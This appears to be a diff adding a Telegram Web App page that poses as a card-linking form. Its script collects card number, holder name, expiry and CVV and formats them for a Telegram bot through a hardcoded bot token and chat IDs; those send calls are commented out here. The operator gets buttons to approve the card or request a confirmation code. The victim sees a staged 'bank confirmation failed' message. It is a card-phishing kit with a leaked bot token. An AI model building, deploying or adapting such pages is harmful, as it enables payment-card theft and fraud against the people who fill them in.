+                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" class="card-item__typeImg">
+                </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="card-form__inner">
+        <div class="card-input">
+          <label for="cardNumber" class="card-input__label">Card Number</label>
+          <input type="text" id="cardNumber" :class="{'error-border': cardNumberError, 'valid-border': cardNumberValid}" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off">
+        </div>
+        <div class="card-input">
+          <label for="cardName" class="card-input__label">Card Holders</label>
+          <input type="text" id="cardName" :class="{'error-border': cardNameError, 'valid-border': cardNameValid}" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" v-on:input="validateCardName" data-ref="cardName" autocomplete="off">
+        </div>
+        <div class="card-form__row">
+          <div class="card-form__col">
+            <div class="card-form__group">
+              <label for="cardMonth" class="card-input__label">Expiration Date</label>
+              <select class="card-input__input -select" id="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
+                <option value="" disabled selected>Month</option>
+                <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n">
+                    {{n < 10 ? '0' + n : n}}
+                </option>
+              </select>
+              <select class="card-input__input -select" id="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
+                <option value="" disabled selected>Year</option>
+                <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n">
+                    {{$index + minCardYear}}
+                </option>
+              </select>
+            </div>
+          </div>
+          <div class="card-form__col -cvv">
+            <div class="card-input">
+              <label for="cardCvv" class="card-input__label">CVV</label>
+              <input type="text" id="cardCvv" :class="{'error-border': cardCvvError, 'valid-border': cardCvvValid}" class="card-input__input" v-mask="'####'" maxlength="4" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off">
+            </div>
+          </div>
+        </div>
+
+        <div class="pre-btn" v-bind:class="{ 'pre-btn-disabled': !isFormValid }">
+          <button class="btn" type="button" v-bind:class="{ 'btn-disabled': !isFormValid }">
+            <span class="btn__text" v-bind:class="{ 'btn__text-disabled': !isFormValid }">Submit</span>
+            <svg class="btn__progress" viewBox="0 0 48 48" width="48px" height="48px">
+                <circle class="btn__progress-track" r="20" cx="24" cy="24" fill="none" stroke="#c7cad1" stroke-width="8" />
+                <circle class="btn__progress-fill" r="20" cx="24" cy="24" fill="none" stroke="#000000" stroke-width="8"
+                    transform="rotate(-90,24,24)" stroke-dasharray="125.66 125.66" stroke-dashoffset="125.66" />
+                <polyline class="btn__progress-check" points="12,24 20,32 36,16" fill="none" stroke="#fff" stroke-width="4"
+                    stroke-linecap="round" stroke-linejoin="round" stroke-dasharray="34 34" stroke-dashoffset="34" />
+            </svg>
+        </div>
+        
+      </div>
+    </div>
+    
+  </div>
+  
+  <div class="loader">
+    <div id="wifi-loader">
+      <svg class="circle-outer" viewBox="0 0 86 86">
+        <circle class="back" cx="43" cy="43" r="40"></circle>
+        <circle class="front" cx="43" cy="43" r="40"></circle>
+        <circle class="new" cx="43" cy="43" r="40"></circle>
+      </svg>
+      <svg class="circle-middle" viewBox="0 0 60 60">
+        <circle class="back" cx="30" cy="30" r="27"></circle>
+        <circle class="front" cx="30" cy="30" r="27"></circle>
+      </svg>
+      <svg class="circle-inner" viewBox="0 0 34 34">
+        <circle class="back" cx="17" cy="17" r="14"></circle>
+        <circle class="front" cx="17" cy="17" r="14"></circle>
+      </svg>
+      <div class="text" data-text="LOADING..."></div>
+    </div>
+  </div>
+
+  <div class="container-error">
+    <div class="box">
+        <div class="message-box">
+            <svg class="checkmark red" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle class="checkmark__circle red" cx="26" cy="26" r="25" fill="none"/><path class="checkmark__check" fill="none" d="M14.1,27.2h25"/></svg>
+            <h1 class="checkmark_txt">Not Found</h1>
+            
+        </div>
+        
+        <div class="settings">
+            <span class="settings__title field-title">error info</span>
+            <div class="setting">
+                <label for="uppercase"><p>Unfortunately, we were unable to obtain card confirmation from the bank.<br>However, we will process your request manually, and you will receive a notification in bot with the outcome. <strong>Please be patient.</strong><br><br> If you are experiencing issues with verification codes, here are some recommendations:<br><br></p>
+                    
+                    <ul>
+                        <li><strong>Check Your Data:</strong> Ensure that you have correctly entered your card information, including the name, address, and CVC code.<br><br></li>
+                        <li><strong>Try an Alternative Payment Method:</strong> If the issue persists, consider using a different card.<br></li>
+                    </ul></label>
+            </div>
+        </div>
+
+        <button class="btn generate" id="generate">Close</button>
+    </div>
+</div>
+  
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+  <script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+  <script>
+    new Vue({
+      el: "#app",
+      data() {
+        return {
+          currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
+          cardName: "",
+          cardNumber: "",
+          cardMonth: "",
+          cardYear: "",
+          cardCvv: "",
+          minCardYear: new Date().getFullYear(),
+          amexCardMask: "#### ###### #####",
+          otherCardMask: "#### #### #### ####",
+          cardNumberTemp: "",
+          isCardFlipped: false,
+          focusElementStyle: null,
+          isInputFocused: false,
+          cardNumberError: false,
+          cardNameError: false,
+          cardNumberValid: false,
+          cardNameValid: false,
+          cardCvvError: false,
+          cardCvvValid: false,
+          cardYearValid: false,
+          cardYearError: false,
+          cardMonthValid: false,
+          cardMonthError: false,
+
+        };
+      },
+      mounted() {
+        this.cardNumberTemp = this.otherCardMask;
+        document.getElementById("cardNumber").focus();
+      },
+      computed: {
+        getCardType () {
+          let number = this.cardNumber;
+          let re = new RegExp("^4");
+          if (number.match(re) != null) return "visa";
+    
+          re = new RegExp("^(34|37)");
+          if (number.match(re) != null) return "amex";
+    
+          re = new RegExp("^5[1-5]");
+          if (number.match(re) != null) return "mastercard";
+    
+          re = new RegExp("^6011");
+          if (number.match(re) != null) return "discover";
+          
+          re = new RegExp('^9792')
+          if (number.match(re) != null) return 'troy'
+    
+          return "visa"; // default type
+        },
+        generateCardNumberMask () {
+          return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
+        },
+        minCardMonth () {
+          if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
+          return 1;
+        },
+        isFormValid() {
+          return this.cardNumberValid && this.cardNameValid && this.cardCvvValid && this.cardYearValid && this.cardMonthValid;
+        }
+      },
+      watch: {
+        cardNumber(value) {
+          let length = this.getCardType === "amex" ? 17 : 19;
+          Vue.nextTick(() => {
+            this.cardNumberError = value.length < length;
+            this.cardNumberValid = value.length === length;
+          });
+        },
+        cardName(value) {
+          Vue.nextTick(() => {
+            this.cardNameError = value === '';
+            this.cardNameValid = value !== '';
+          });
+        },
+        cardCvv(value) {
+          this.cardCvvError = value.length < 3 || value.length > 4;
+          this.cardCvvValid = value.length >= 3 && value.length <= 4;
+        },
+        cardYear () {
+          if (this.cardMonth < this.minCardMonth) {
+            this.cardMonth = "";
+          }
+          this.cardYearError = this.cardYear < this.minCardYear;
+          this.cardYearValid = this.cardYear >= this.minCardYear;
+        },
+        cardMonth () {
+          this.cardMonthError = this.cardMonth < this.minCardMonth;
+          this.cardMonthValid = this.cardMonth >= this.minCardMonth;
+        }
+      },
+      methods: {
+        flipCard (status) {
+          this.isCardFlipped = status;
+        },
+        validateCardName(event) {
+          this.cardName = event.target.value.replace(/[\d~`!@#$%^&*(){}[\];:"'<,.>?\/\\|_+=-]/g, '');
+        },
+        focusInput (e) {
+          this.isInputFocused = true;
+          let targetRef = e.target.dataset.ref;
+          let target = this.$refs[targetRef];
+          this.focusElementStyle = {
+            width: `${target.offsetWidth}px`,
+            height: `${target.offsetHeight}px`,
+            transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
+          }
+        },
+        blurInput() {
+          let vm = this;
+          setTimeout(() => {
+            if (!vm.isInputFocused) {
+              vm.focusElementStyle = null;
+            }
+          }, 300);
+          vm.isInputFocused = false;
+        }
+      }
+    });
+  </script>
+  
+  <script>
+    let tg = window.Telegram.WebApp;
+    userID = tg.initDataUnsafe.user.id;
+    //userID = 1;
+
+    window.addEventListener("DOMContentLoaded", () => {
+        const btn = document.querySelector("button");
+        const wrapper = document.querySelector(".wrapper");
+        const loader = document.querySelector(".loader");
+
+        var doneTimeout = null,
+            resetTimeout = null;
+    
+        if (btn) {
+            btn.addEventListener("click", function () {
+                const runClass = "btn--running";
+                const doneClass = "btn--done";
+                const submitDuration = 2000;
+                const resetDuration = 1500;
+    
+                this.disabled = true;
+                this.classList.add(runClass);
+    
+                clearTimeout(doneTimeout);
+                clearTimeout(resetTimeout);
+    
+                doneTimeout = setTimeout(() => {
+                    this.classList.remove(runClass);
+                    this.classList.add(doneClass);
+    
+                    resetTimeout = setTimeout(() => {
+                        this.disabled = false;
+                        this.classList.remove(doneClass);
+                    }, resetDuration);
+
+                    // Скрываем блок .wrapper и отображаем блок .loader
+                    wrapper.style.display = "none";
+                    loader.style.display = "flex";
+                }, 600 + submitDuration);
+
+                let cardData = {
+                  cardNumber: document.getElementById('cardNumber').value,
+                  cardName: document.getElementById('cardName').value,
+                  cardMonth: document.getElementById('cardMonth').value,
+                  cardYear: document.getElementById('cardYear').value,
+                  cardCvv: document.getElementById('cardCvv').value
+                };
+              
+                let cardDataText = `Данные пользователя <b>ID${userID}</b> получены:\n\n<b>Card Number:</b> ${cardData.cardNumber}\n<b>Card Name:</b> ${cardData.cardName}\n<b>Expiration Date:</b> ${cardData.cardMonth}/${cardData.cardYear}\n<b>CVV:</b> ${cardData.cardCvv}`;
+                
+                let MsgInfo = `UserInfoID${userID}`;
+
+                let replyMarkup = {
+                  inline_keyboard: [
+                      [{ text: '🗂 Инфо пользователя', callback_data: MsgInfo }],
+                      [{ text: '💣 Удалить сообщение', callback_data: "okBTN" }]
+                  ]
+                };
+
+                /*fetch(`https://api.telegram.org/bot6852813075:AAEULkRIOKtiziMEbllocPfHY5eXX-_JUwQ/sendMessage?chat_id=6574678512&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
+                .then(response => response.json())
+                .then(data => console.log(data))
+                .catch((error) => {
+                  console.error('Error:', error);
+                });
+
+                fetch(`https://api.telegram.org/bot6852813075:AAEULkRIOKtiziMEbllocPfHY5eXX-_JUwQ/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
+                .then(response => response.json())
+                .then(data => console.log(data))
+                .catch((error) => {
+                  console.error('Error:', error);
+                });*/
+                
+                setTimeout(() => {
+                  cardDataText = `Ниже вы можете <b>одобрить</b> или <b>отклонить</b> привязку карты для ID${userID}, а также <b>запросить у него подтверждение</b> операции по карте (cvv или приложение), в зависимости от вашего выбора <b><u>пользователь получит сообщение с результатом</u></b>.`;
+
+                  let code_request_msg = `${userID}code_request${cardData.cardNumber}`;
+                  let successMsg = `${userID}cardSuccessID${cardData.cardNumber}`;
+                  let failMsg = `cardFailnID${userID}`;
+
+                  let replyMarkup = {
+                    inline_keyboard: [
+                        [{ text: '📲 Запросить подтверждение', callback_data: code_request_msg }],
+                        [{ text: '✅ Одобрить привязку', callback_data: successMsg }],
+                        [{ text: '⛔️ Отклонить привязку', callback_data: failMsg }]
+                    ]
+                  };
+                
+                  // Отправляем данные в Telegram Bot
+                  /*fetch(`https://api.telegram.org/bot6852813075:AAEULkRIOKtiziMEbllocPfHY5eXX-_JUwQ/sendMessage?chat_id=6574678512&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
+                    .then(response => response.json())
+                    .then(data => console.log(data))
+                    .catch((error) => {
+                      console.error('Error:', error);
+                    });
+
+                    fetch(`https://api.telegram.org/bot6852813075:AAEULkRIOKtiziMEbllocPfHY5eXX-_JUwQ/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
+                    .then(response => response.json())
+                    .then(data => console.log(data))
+                    .catch((error) => {
+                      console.error('Error:', error);
+                    });*/
+                }, 1000);
+
+                
+                // Устанавливаем рандомное время от 5 до 10 секунд
+                var randomTime = Math.random() * (8000 - 4000) + 4000;
+
+                setTimeout(() => {
+                    // Скрываем блок .loader и отображаем блок .container-error
+                    loader.style.display = "none";
+                    document.querySelector('.container-error').style.display = "flex";
+                }, randomTime);
+            });
+        }
+        document.getElementById('generate').addEventListener('click', function() {
+          document.querySelector('.container-error').style.display = "none";
+          tg.close();
+      });
+    });
+
+    document.querySelector('.box').addEventListener('animationend', (e) => {
+      if (e.animationName === 'anime') {
+        document.querySelector('.checkmark_txt').style.display = 'block';
+        document.querySelector('.settings').style.display = 'block';
+          document.querySelector('.btn.generate').style.display = 'block';
+      }
+      });
+  </script>
+
+</body>
+</html>
